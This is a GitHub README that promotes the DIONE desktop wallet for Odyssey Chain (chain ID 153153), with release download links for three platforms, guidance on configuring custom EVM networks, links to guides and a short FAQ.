<p align="center">
  <img src="assets/banner-profile.png" alt="DIONE Wallet: self-custody wallet for Odyssey Chain" width="100%">
</p>

<h1 align="center">DIONE Wallet</h1>

<p align="center">Chain settings you do not have to guess, in a wallet built for Odyssey from the start.</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9"><img src="https://img.shields.io/badge/RELEASE-v4.5.9-66519E?style=for-the-badge" alt="Release v4.5.9"></a> <a href="https://github.com/dione-protocol/chains/blob/master/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-006971?style=for-the-badge" alt="License MIT"></a></p>

## Downloads - v4.5.9

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

Checksums for every file are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

---

The chain ID in the guide does not match the one the application expects, and the network that results resolves to nothing. Six digits, one wrong character, and an interface that looks configured but cannot fetch a block. Most of the confusion around a new chain is not the chain at all; it is a settings panel where four fields have to agree with a source you trust.

That is the argument for a wallet that already knows the network it was built for. DIONE Wallet ships Odyssey Chain configured, with chain ID 153153 and the RPC and explorer it needs, so the first launch is a wallet rather than a setup exercise. Other EVM networks can still be added by hand, and the application asks for all four fields and reports when they do not resolve, which is more than most panels do.

## Why DIONE Wallet

Getting the network right is the difference between a wallet and a form. Once Odyssey Chain is configured, everything the chain offers is available without a second tool.

- Odyssey Chain ready at install, with the explorer one click from the balance.
- Custom networks accepted through name, RPC URL, chain ID and symbol, with the chain ID treated as the exact field it is.
- Staking, validator data and reward tracking that only appear because the network is understood, not guessed at.
- Signed builds with published checksums, so the configuration you trust is the configuration that runs.

A note that saves an afternoon: a chain ID that is one digit off does not produce an error message that mentions the chain ID. It produces an empty balance and a spinner, which is why the guides here start with the explorer rather than with the application. Read the address on the chain's own explorer, compare the number it reports with the number in the settings panel, and the whole class of problem collapses into one correction.

This repository is the chain-configuration side of Odyssey Chain, and this page is one of the wallet's pages rather than a description of it.

## Guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md) | The four fields, filled in order, with the chain ID called out as the exact one. |
| [How Odyssey Chain Powers DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/how-odyssey-chain-powers-dione.md) | Chain ID 153153, the RPC endpoint, the explorer and the validator set behind the chain. |
| [DIONE Wallet Stuck on Connecting](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-stuck-on-connecting.md) | When a configured network still will not answer, and what to remove first. |
| [Odyssey Chain Gas Fees Inside DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/odyssey-chain-gas-fees-in-dione-wallet.md) | What the network charges for gas, and why the wallet adds nothing on top of that fee. |

</div>

**The phrase is the wallet.** A network setting is public information and a phrase is not; no chain configuration screen has any reason to ask for the words.

## What changes once the wallet is installed

A network that would not resolve becomes a chain you can use. The balance appears, the explorer link in the wallet opens the same address, and the staking screens stop being empty because the application finally knows which chain it is talking to.

The lesson from the settings panel is worth keeping after it works. Every field in a network entry is checkable against the chain's own documentation, and a wallet that already ships the right values removes four chances to mistype one of them. That is the reason the first launch here is a wallet rather than a form.

- Odyssey Chain arrives configured, with the chain ID and endpoint already correct.
- Other EVM networks are added deliberately, with the chain ID treated as exact.
- The explorer is one click from the balance, which is where a wrong setting shows up first.

## Common first questions

### What is Odyssey Chain's chain ID?

153153. It is the field that has to match exactly, and a single wrong digit produces a network that looks configured and fetches nothing.

### Can I add Ethereum or Polygon to the same wallet?

Yes. Any EVM network is accepted through its name, RPC URL, chain ID and symbol, and the wallet keeps them as separate entries rather than replacing Odyssey Chain.

### Why does the app show an empty balance on a network I just added?

Because the address on that network has no history yet, or because the chain ID does not match the endpoint. Check the address on that chain's explorer before changing anything else.

## Support

Release questions and bugs go to the [dione-desktop-wallet issue tracker](https://github.com/dione-protocol/dione-desktop-wallet/issues). Report a vulnerability through a private security advisory on the same repository.

## License

MIT

---

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet">DIONE Wallet application</a> | <a href="https://github.com/dione-protocol/setup-and-troubleshooting">All guides</a> | <a href="https://github.com/dione-protocol">All repositories</a></p>
